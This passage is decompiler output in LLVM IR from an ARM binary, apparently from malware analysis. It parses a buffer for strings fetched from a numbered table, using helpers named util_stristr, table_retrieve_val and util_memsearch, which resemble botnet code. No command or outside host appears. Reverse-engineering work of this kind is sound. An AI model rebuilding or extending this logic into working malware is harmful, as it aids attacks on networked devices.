  %v2_9180 = add i32 %v2_917c, %v1_9180
  store i32 %v2_9180, i32* %r3.global-to-local, align 4
  %v0_9184 = load i32, i32* @r5, align 4
  %v1_9184 = trunc i32 %v0_9184 to i8
  %v3_9184 = load i32, i32* @r7, align 4
  %v4_9184 = add i32 %v3_9184, %v2_9180
  %v5_9184 = inttoptr i32 %v4_9184 to i8*
  store i8 %v1_9184, i8* %v5_9184, align 1
  %v0_9188 = load i32, i32* @r6, align 4
  store i32 %v0_9188, i32* %r0.global-to-local, align 4
  %v1_918c = inttoptr i32 %v0_9188 to i8*
  %v2_918c = call i32 @util_strlen(i8* %v1_918c)
  %v0_9190 = load i32, i32* @r5, align 4
  store i32 %v0_9190, i32* %r1.global-to-local, align 4
  store i32 %v2_918c, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_919c = inttoptr i32 %v0_9190 to i32*
  %v3_919c = call i32 @table_retrieve_val(i32 43, i32* %v2_919c)
  %v0_91a0 = load i32, i32* @r4, align 4
  store i32 %v0_91a0, i32* @r1, align 4
  store i32 %v3_919c, i32* %r2.global-to-local, align 4
  %v0_91a8 = load i32, i32* @r6, align 4
  store i32 %v0_91a8, i32* %r0.global-to-local, align 4
  %v3_91ac = inttoptr i32 %v0_91a8 to i8*
  %v4_91ac = call i32 @util_stristr(i8* %v3_91ac, i32 %v0_91a0, i32 %v3_919c)
  store i32 %v4_91ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_91b0 = icmp eq i32 %v4_91ac, 0
  store i1 %v2_91b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_91b0, label %.thread25, label %bb186

bb186:                                            ; preds = %bb185
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_91b8 = load i32, i32* @sl, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i32*
  store i32 1, i32* %v4_91b8, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb185, %dec_label_pc_9118, %.thread24, %bb186
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_91c8 = load i32, i32* @sl, align 4
  %v2_91c8 = add i32 %v1_91c8, 8
  %v3_91c8 = inttoptr i32 %v2_91c8 to i32*
  store i32 0, i32* %v3_91c8, align 4
  %v3_91cc = call i32 @table_retrieve_val(i32 41, i32* null)
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91d0, i32* @r1, align 4
  store i32 %v3_91cc, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_91dc = call i32 @util_stristr(i8* %tmp168, i32 %v0_91d0, i32 %v3_91cc)
  store i32 %v4_91dc, i32* %r0.global-to-local, align 4
  %v2_91e4 = icmp eq i32 %v4_91dc, -1
  store i1 %v2_91e4, i1* %cpsr_c.global-to-local, align 1
  %v7_91e4 = icmp eq i32 %v4_91dc, -1
  store i1 %v7_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_91e4, label %.thread26, label %dec_label_pc_91f0

dec_label_pc_91f0:                                ; preds = %.thread25
  %v0_91f0 = load i32, i32* @r7, align 4
  store i32 %v0_91f0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_91f8 = inttoptr i32 %v0_91f0 to i32*
  %v3_91f8 = call i32 @table_retrieve_val(i32 41, i32* %v2_91f8)
  %v0_91fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91fc, i32* @r1, align 4
  store i32 %v3_91f8, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9208 = call i32 @util_stristr(i8* %tmp168, i32 %v0_91fc, i32 %v3_91f8)
  store i32 %v4_9208, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %ip.global-to-local, align 4
  %v2_9210 = add i32 %v4_9208, %v2_827c
  %v3_9210 = inttoptr i32 %v2_9210 to i8*
  %v4_9210 = load i8, i8* %v3_9210, align 1
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9218 = icmp ugt i8 %v4_9210, 31
  store i1 %v2_9218, i1* %cpsr_c.global-to-local, align 1
  %v7_9218 = icmp eq i8 %v4_9210, 32
  store i1 %v7_9218, i1* %cpsr_z.global-to-local, align 1
  %v2_9220 = zext i1 %v7_9218 to i32
  %v2_9220.v4_9208 = add i32 %v2_9220, %v4_9208
  store i32 %v2_9220.v4_9208, i32* @r4, align 4
  %v2_9224 = add i32 %v2_9220.v4_9208, %v2_827c
  store i32 %v2_9224, i32* @r5, align 4
  store i32 %v2_9224, i32* %r0.global-to-local, align 4
  %v1_922c = load i32, i32* %fp.global-to-local, align 4
  %v2_922c = sub i32 %v1_922c, %v2_9220.v4_9208
  store i32 %v2_922c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9238 = call i32 @util_memsearch(i32 %v2_9224, i32 %v2_922c, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2)
  store i32 %v5_9238, i32* %r0.global-to-local, align 4
  %v2_923c = icmp eq i32 %v5_9238, -1
  store i1 %v2_923c, i1* %cpsr_c.global-to-local, align 1
  %v7_923c = icmp eq i32 %v5_9238, -1
  store i1 %v7_923c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_923c, label %.thread26, label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_91f0
  %v2_9244 = icmp ne i32 %v5_9238, 0
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  %v7_9244 = icmp eq i32 %v5_9238, 1
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r1.global-to-local, align 4
  %v7_924c = icmp slt i32 %v5_9238, 2
  br i1 %v7_924c, label %bb188, label %bb187

bb187:                                            ; preds = %dec_label_pc_9244
  %v9_924c = add i32 %v5_9238, -2
  store i32 %v9_924c, i32* %r0.global-to-local, align 4
  br label %bb188

bb188:                                            ; preds = %dec_label_pc_9244, %bb187
  %v1_9254 = phi i32 [ %v5_9238, %dec_label_pc_9244 ], [ %v9_924c, %bb187 ]
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v2_9254 = add i32 %v1_9254, %v2_8710
  %v1_9258 = load i32, i32* @r4, align 4
  %v2_9258 = add i32 %v2_9254, %v1_9258
  store i32 %v2_9258, i32* %r3.global-to-local, align 4
  %v0_925c = load i32, i32* @r7, align 4
  %v1_925c = trunc i32 %v0_925c to i8
  %v3_925c = load i32, i32* @r6, align 4
  %v4_925c = add i32 %v3_925c, %v2_9258
  %v5_925c = inttoptr i32 %v4_925c to i8*
  store i8 %v1_925c, i8* %v5_925c, align 1
  %v0_9260 = load i32, i32* @r5, align 4
  store i32 %v0_9260, i32* %r0.global-to-local, align 4
  %v1_9264 = inttoptr i32 %v0_9260 to i8*
  %v2_9264 = call i32 @util_strlen(i8* %v1_9264)
  %v0_9268 = load i32, i32* @r7, align 4
  store i32 %v0_9268, i32* %r1.global-to-local, align 4
  store i32 %v2_9264, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_9274 = inttoptr i32 %v0_9268 to i32*
  %v3_9274 = call i32 @table_retrieve_val(i32 42, i32* %v2_9274)
  %v0_9278 = load i32, i32* @r4, align 4
  store i32 %v0_9278, i32* @r1, align 4
  store i32 %v3_9274, i32* %r2.global-to-local, align 4
  %v0_9280 = load i32, i32* @r5, align 4
  store i32 %v0_9280, i32* %r0.global-to-local, align 4
  %v3_9284 = inttoptr i32 %v0_9280 to i8*
  %v4_9284 = call i32 @util_stristr(i8* %v3_9284, i32 %v0_9278, i32 %v3_9274)
  store i32 %v4_9284, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9288 = icmp eq i32 %v4_9284, 0
  store i1 %v2_9288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9288, label %.thread26, label %bb189

bb189:                                            ; preds = %bb188
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9290 = load i32, i32* @sl, align 4
  %v3_9290 = add i32 %v2_9290, 8
  %v4_9290 = inttoptr i32 %v3_9290 to i32*
  store i32 1, i32* %v4_9290, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb188, %dec_label_pc_91f0, %.thread25, %bb189
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_929c = call i32 @table_retrieve_val(i32 40, i32* null)
  %v0_92a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_92a0, i32* @r1, align 4
  store i32 %v3_929c, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_92ac = call i32 @util_stristr(i8* %tmp168, i32 %v0_92a0, i32 %v3_929c)
  store i32 %v4_92ac, i32* %r0.global-to-local, align 4
  %v2_92b0 = icmp eq i32 %v4_92ac, -1
  store i1 %v2_92b0, i1* %cpsr_c.global-to-local, align 1
  %v7_92b0 = icmp eq i32 %v4_92ac, -1
  store i1 %v7_92b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92b0, label %.thread, label %dec_label_pc_92c8

.thread:                                          ; preds = %.thread26
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @sl, align 4
  %v3_92c0 = add i32 %v2_92c0, 12
  %v4_92c0 = inttoptr i32 %v3_92c0 to i32*
  store i32 0, i32* %v4_92c0, align 4
  br label %dec_label_pc_934c

dec_label_pc_92c8:                                ; preds = %.thread26
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_92d0 = call i32 @table_retrieve_val(i32 40, i32* null)
  %v0_92d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_92d4, i32* @r1, align 4
  store i32 %v3_92d0, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_92e0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_92d4, i32 %v3_92d0)
  store i32 %v4_92e0, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r2.global-to-local, align 4
  %v2_92e8 = add i32 %v4_92e0, %v2_827c
  %v3_92e8 = inttoptr i32 %v2_92e8 to i8*
  %v4_92e8 = load i8, i8* %v3_92e8, align 1
  %v2_92ec = icmp ugt i8 %v4_92e8, 31
  store i1 %v2_92ec, i1* %cpsr_c.global-to-local, align 1
  %v7_92ec = icmp eq i8 %v4_92e8, 32
  store i1 %v7_92ec, i1* %cpsr_z.global-to-local, align 1
  %v2_92f8 = zext i1 %v7_92ec to i32
  %v2_92f8.v4_92e0 = add i32 %v2_92f8, %v4_92e0
  store i32 %v2_92f8.v4_92e0, i32* @r4, align 4
  %v2_92fc = add i32 %v2_92f8.v4_92e0, %v2_827c
  store i32 %v2_92fc, i32* @r5, align 4
  store i32 %v2_92fc, i32* %r0.global-to-local, align 4
  %v1_9304 = load i32, i32* %fp.global-to-local, align 4
  %v2_9304 = sub i32 %v1_9304, %v2_92f8.v4_92e0
  store i32 %v2_9304, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9310 = call i32 @util_memsearch(i32 %v2_92fc, i32 %v2_9304, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2)
  store i32 %v5_9310, i32* %r0.global-to-local, align 4
  %v2_9314 = icmp eq i32 %v5_9310, -1
  store i1 %v2_9314, i1* %cpsr_c.global-to-local, align 1
  %v7_9314 = icmp eq i32 %v5_9310, -1
  store i1 %v7_9314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9314, label %dec_label_pc_934c, label %dec_label_pc_931c

dec_label_pc_931c:                                ; preds = %dec_label_pc_92c8
  %v2_931c = icmp ne i32 %v5_9310, 0
  store i1 %v2_931c, i1* %cpsr_c.global-to-local, align 1
  %v7_931c = icmp eq i32 %v5_9310, 1
  store i1 %v7_931c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %ip.global-to-local, align 4
  %v7_9324 = icmp slt i32 %v5_9310, 2
  br i1 %v7_9324, label %bb191, label %bb190

bb190:                                            ; preds = %dec_label_pc_931c
  %v9_9324 = add i32 %v5_9310, -2
  store i32 %v9_9324, i32* %r0.global-to-local, align 4
  br label %bb191

bb191:                                            ; preds = %dec_label_pc_931c, %bb190
  %v1_932c = phi i32 [ %v5_9310, %dec_label_pc_931c ], [ %v9_9324, %bb190 ]
  store i32 %v2_8710, i32* %ip.global-to-local, align 4
  %v2_932c = add i32 %v1_932c, %v2_8710
  %v1_9330 = load i32, i32* @r4, align 4
  %v2_9330 = add i32 %v2_932c, %v1_9330
  store i32 %v2_9330, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9338 = load i32, i32* @r5, align 4
  store i32 %v0_9338, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_9340 = load i32, i32* @r6, align 4
  %v4_9340 = add i32 %v3_9340, %v2_9330
  %v5_9340 = inttoptr i32 %v4_9340 to i8*
  store i8 0, i8* %v5_9340, align 1
  %v2_9344 = inttoptr i32 %v0_9338 to i8*
  %v3_9344 = call i32 @util_atoi(i8* %v2_9344, i32 10)
  store i32 %v3_9344, i32* %r0.global-to-local, align 4
  %v1_9348 = load i32, i32* @sl, align 4
  %v2_9348 = add i32 %v1_9348, 12
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v3_9344, i32* %v3_9348, align 4
  br label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %.thread, %dec_label_pc_92c8, %bb191
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_9350:                                ; preds = %dec_label_pc_951c, %dec_label_pc_949c, %dec_label_pc_934c
  %v1_935c = phi i32 [ 0, %dec_label_pc_934c ], [ %v0_949c, %dec_label_pc_949c ], [ %v1_935c.pre.pre, %dec_label_pc_951c ]
  store i32 %v2_827c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_935c = add i32 %v1_935c, %v2_827c
  store i32 %v2_935c, i32* @r4, align 4
  %v3_9360 = call i32 @table_retrieve_val(i32 39, i32* null)
  %v0_9364 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9364, i32* @r1, align 4
  store i32 %v3_9360, i32* %r2.global-to-local, align 4
  %v0_936c = load i32, i32* @r4, align 4
  store i32 %v0_936c, i32* %r0.global-to-local, align 4
  %v3_9370 = inttoptr i32 %v0_936c to i8*
  %v4_9370 = call i32 @util_stristr(i8* %v3_9370, i32 %v0_9364, i32 %v3_9360)
  store i32 %v4_9370, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_937c = icmp eq i32 %v4_9370, -1
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  %v7_937c = icmp eq i32 %v4_9370, -1
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_937c, label %dec_label_pc_9588, label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9350
  %v0_9388 = load i32, i32* @sl, align 4
  %v1_9388 = add i32 %v0_9388, 16
  %v2_9388 = inttoptr i32 %v1_9388 to i32*
  %v3_9388 = load i32, i32* %v2_9388, align 4
  store i32 %v3_9388, i32* %r3.global-to-local, align 4
  %v2_938c = icmp ugt i32 %v3_9388, 3
  store i1 %v2_938c, i1* %cpsr_c.global-to-local, align 1
  %v7_938c = icmp eq i32 %v3_9388, 4
  store i1 %v7_938c, i1* %cpsr_z.global-to-local, align 1
  %v8_9390 = icmp sgt i32 %v3_9388, 4
  br i1 %v8_9390, label %dec_label_pc_9588, label %dec_label_pc_9394

dec_label_pc_9394:                                ; preds = %dec_label_pc_9388
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_939c = call i32 @table_retrieve_val(i32 39, i32* null)
  %v0_93a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_93a0, i32* @r1, align 4
  store i32 %v3_939c, i32* %r2.global-to-local, align 4
  %v0_93a8 = load i32, i32* @r4, align 4
  store i32 %v0_93a8, i32* %r0.global-to-local, align 4
  %v3_93ac = inttoptr i32 %v0_93a8 to i8*
  %v4_93ac = call i32 @util_stristr(i8* %v3_93ac, i32 %v0_93a0, i32 %v3_939c)
  store i32 %v4_93ac, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v1_93b4 = load i32, i32* @r5, align 4
  %v2_93b4 = add i32 %v1_93b4, %v4_93ac
  store i32 %v2_93b4, i32* @r8, align 4
  %v2_93b8 = add i32 %v2_93b4, %v2_827c
  %v3_93b8 = inttoptr i32 %v2_93b8 to i8*
  %v4_93b8 = load i8, i8* %v3_93b8, align 1
  %v6_93b8 = zext i8 %v4_93b8 to i32
  store i32 %v6_93b8, i32* %r3.global-to-local, align 4
  %v2_93bc = icmp ugt i8 %v4_93b8, 31
  store i1 %v2_93bc, i1* %cpsr_c.global-to-local, align 1
  %v7_93bc = icmp eq i8 %v4_93b8, 32
  store i1 %v7_93bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93bc, label %bb192, label %bb193

bb192:                                            ; preds = %dec_label_pc_9394
  %v2_93c0 = add i32 %v4_93ac, 1
  store i32 %v2_93c0, i32* %r0.global-to-local, align 4
  br label %bb193

bb193:                                            ; preds = %dec_label_pc_9394, %bb192
  %v1_93d0 = phi i32 [ %v4_93ac, %dec_label_pc_9394 ], [ %v2_93c0, %bb192 ]
  %v1_93c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_93c4 = sub i32 %v1_93c4, %v1_93b4
  store i32 %v2_93c4, i32* %r3.global-to-local, align 4
  %v2_93c8 = sub i32 %v2_93c4, %v1_93d0
  store i32 %v2_93c8, i32* @r7, align 4
  %v0_93cc = load i32, i32* @r4, align 4
  %v2_93cc = add i32 %v0_93cc, %v1_93d0
  store i32 %v2_93cc, i32* @r6, align 4
  br i1 %v7_93bc, label %bb194, label %bb195

bb194:                                            ; preds = %bb193
  %v3_93d0 = add i32 %v1_93d0, %v1_93b4
  store i32 %v3_93d0, i32* @r8, align 4
  br label %bb195

bb195:                                            ; preds = %bb193, %bb194
  store i32 %v2_93c8, i32* %r1.global-to-local, align 4
  store i32 %v2_93cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_93e4 = call i32 @util_memsearch(i32 %v2_93cc, i32 %v2_93c8, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2)
  store i32 %v5_93e4, i32* %r0.global-to-local, align 4
  %v2_93e8 = icmp eq i32 %v5_93e4, -1
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v7_93e8 = icmp eq i32 %v5_93e4, -1
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_93e4, i32* @r4, align 4
  br i1 %v7_93e8, label %dec_label_pc_949c, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %bb195
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v2_93f8 = icmp ne i32 %v5_93e4, 0
  store i1 %v2_93f8, i1* %cpsr_c.global-to-local, align 1
  %v7_93f8 = icmp eq i32 %v5_93e4, 1
  store i1 %v7_93f8, i1* %cpsr_z.global-to-local, align 1
  %v7_93fc = icmp slt i32 %v5_93e4, 2
  br i1 %v7_93fc, label %bb197, label %bb196

bb196:                                            ; preds = %dec_label_pc_93f4
  %v9_93fc = add i32 %v5_93e4, -2
  store i32 %v9_93fc, i32* @r4, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_93f4, %bb196
  %v1_9400 = load i32, i32* @r8, align 4
  %v2_9400 = add i32 %v1_9400, %v2_827c
  store i32 %v2_9400, i32* @r5, align 4
  %v0_9404 = load i32, i32* @r6, align 4
  store i32 %v0_9404, i32* %r0.global-to-local, align 4
  %v0_9408 = load i32, i32* @r7, align 4
  store i32 %v0_9408, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b408.49 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9414 = call i32 @util_memsearch(i32 %v0_9404, i32 %v0_9408, i32 ptrtoint (i32* @global_var_1b408.49 to i32), i32 1)
  store i32 %v4_9414, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9418 = icmp eq i32 %v4_9414, 0
  store i1 %v2_9418, i1* %cpsr_z.global-to-local, align 1
  %tmp198 = icmp slt i32 %v4_9414, 1
  br i1 %tmp198, label %.dec_label_pc_9438_crit_edge, label %dec_label_pc_9420

.dec_label_pc_9438_crit_edge:                     ; preds = %bb197
  %v1_9440.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9438

dec_label_pc_9420:                                ; preds = %bb197
  %v0_9420 = load i32, i32* @r6, align 4
  store i32 %v0_9420, i32* %r0.global-to-local, align 4
  %v0_9424 = load i32, i32* @r7, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b408.49 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9430 = call i32 @util_memsearch(i32 %v0_9420, i32 %v0_9424, i32 ptrtoint (i32* @global_var_1b408.49 to i32), i32 1)
  store i32 %v4_9430, i32* %r0.global-to-local, align 4
  %v1_9434 = add i32 %v4_9430, -1
  store i32 %v1_9434, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %.dec_label_pc_9438_crit_edge, %dec_label_pc_9420
  %v1_9440 = phi i32 [ %v1_9440.pre, %.dec_label_pc_9438_crit_edge ], [ %v1_9434, %dec_label_pc_9420 ]
  %v2_9440 = add i32 %v1_9440, %v2_8710
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_944c = load i32, i32* @r8, align 4
  %v2_944c = add i32 %v2_9440, %v1_944c
  store i32 %v2_944c, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_9454 = add i32 %v2_944c, -20773
  %v5_9454 = inttoptr i32 %v4_9454 to i8*
  store i8 0, i8* %v5_9454, align 1
  %storemerge6.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9474.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9474

dec_label_pc_9460:                                ; preds = %dec_label_pc_9474
  br i1 %v7_9464, label %dec_label_pc_94a4, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_9460
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9474

dec_label_pc_9474:                                ; preds = %dec_label_pc_9438, %dec_label_pc_946c
  %v0_9474 = phi i32 [ %v0_9460, %dec_label_pc_946c ], [ %v0_9474.pre, %dec_label_pc_9438 ]
  %storemerge6 = phi i32 [ %v1_9488, %dec_label_pc_946c ], [ %storemerge6.pre, %dec_label_pc_9438 ]
  store i32 %storemerge6, i32* %stack_var_-44, align 4
  store i32 %v0_9474, i32* %r0.global-to-local, align 4
  %v1_9478 = inttoptr i32 %v0_9474 to i8*
  %v2_9478 = call i32 @util_strlen(i8* %v1_9478)
  store i32 %v2_9478, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9480 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9480, i32* %r4.global-to-local, align 4
  %v3_9484 = icmp uge i32 %v2_9478, %v3_9480
  store i1 %v3_9484, i1* %cpsr_c.global-to-local, align 1
  %v9_9484 = icmp eq i32 %v2_9478, %v3_9480
  store i1 %v9_9484, i1* %cpsr_z.global-to-local, align 1
  %v1_9488 = add i32 %v3_9480, 1
  store i32 %v1_9488, i32* %ip.global-to-local, align 4
  %v8_948c = icmp sgt i32 %v2_9478, %v3_9480
  %v0_9460 = load i32, i32* @r5, align 4
  %v2_9460 = add i32 %v0_9460, %v3_9480
  %v3_9460 = inttoptr i32 %v2_9460 to i8*
  %v4_9460 = load i8, i8* %v3_9460, align 1
  %v6_9460 = zext i8 %v4_9460 to i32
  store i32 %v6_9460, i32* %r3.global-to-local, align 4
  %v2_9464 = icmp ugt i8 %v4_9460, 60
  store i1 %v2_9464, i1* %cpsr_c.global-to-local, align 1
  %v7_9464 = icmp eq i8 %v4_9460, 61
  store i1 %v7_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_948c, label %dec_label_pc_9460, label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9474
  br i1 %v7_9464, label %dec_label_pc_94a4, label %dec_label_pc_949c

dec_label_pc_949c:                                ; preds = %dec_label_pc_94e8, %dec_label_pc_950c, %dec_label_pc_9490, %bb195
  %v0_949c = load i32, i32* @r8, align 4
  store i32 %v0_949c, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_94a4:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9490
  %v0_94a4 = load i32, i32* @sl, align 4
  %v1_94a4 = add i32 %v0_94a4, 16
  %v2_94a4 = inttoptr i32 %v1_94a4 to i32*
  %v3_94a4 = load i32, i32* %v2_94a4, align 4
  store i32 %v3_94a4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94b0 = icmp eq i32 %v3_94a4, 0
  store i1 %v2_94b0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %tmp199 = icmp slt i32 %v3_94a4, 1
  br i1 %tmp199, label %dec_label_pc_950c, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94a4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94e8

dec_label_pc_94c4:                                ; preds = %dec_label_pc_94e8
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_94c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94c8, i32* %r3.global-to-local, align 4
  %v0_94cc = load i32, i32* @sl, align 4
  %v1_94cc = add i32 %v0_94cc, 16
  %v2_94cc = inttoptr i32 %v1_94cc to i32*
  %v3_94cc = load i32, i32* %v2_94cc, align 4
  %v1_94d0 = add i32 %v3_94c8, 1
  store i32 %v1_94d0, i32* %ip.global-to-local, align 4
  %v3_94d4 = icmp uge i32 %v3_94cc, %v1_94d0
  store i1 %v3_94d4, i1* %cpsr_c.global-to-local, align 1
  %v9_94d4 = icmp eq i32 %v3_94cc, %v1_94d0
  store i1 %v9_94d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_94d0, i32* %r1.global-to-local, align 4
  store i32 %v1_94d0, i32* %stack_var_-44, align 4
  %v7_94e4 = icmp sgt i32 %v3_94cc, %v1_94d0
  %v0_94f4.pre = load i32, i32* @r5, align 4
  br i1 %v7_94e4, label %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge, label %dec_label_pc_950c

dec_label_pc_94c4.dec_label_pc_94e8_crit_edge:    ; preds = %dec_label_pc_94c4
  %v0_94f8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_94e8

dec_label_pc_94e8:                                ; preds = %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge, %dec_label_pc_94bc
  %v0_94f8 = phi i32 [ %v0_94f8.pre, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ %v3_9480, %dec_label_pc_94bc ]
  %v0_94f4 = phi i32 [ %v0_94f4.pre, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ %v0_9460, %dec_label_pc_94bc ]
  %v0_94e8 = phi i32 [ %v1_94d0, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ 0, %dec_label_pc_94bc ]
  %v1_94e8 = and i32 %v0_94e8, 33554432
  %v2_94e8 = icmp ne i32 %v1_94e8, 0
  store i1 %v2_94e8, i1* %cpsr_c.global-to-local, align 1
  %v3_94e8 = mul i32 %v0_94e8, 128
  %v1_94ec = add i32 %v3_94e8, 1472
  %v0_94f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_94f0 = add i32 %v1_94ec, %v0_94f0
  store i32 %v2_94f0, i32* %r1.global-to-local, align 4
  store i32 %v0_94f4, i32* %r0.global-to-local, align 4
  store i32 %v0_94f8, i32* %r2.global-to-local, align 4
  %v3_94fc = inttoptr i32 %v0_94f4 to i8*
  %v4_94fc = call i32 @util_strncmp(i8* %v3_94fc, i32 %v2_94f0, i32 %v0_94f8)
  store i32 %v4_94fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9500 = icmp eq i32 %v4_94fc, 0
  store i1 %v2_9500, i1* %cpsr_z.global-to-local, align 1
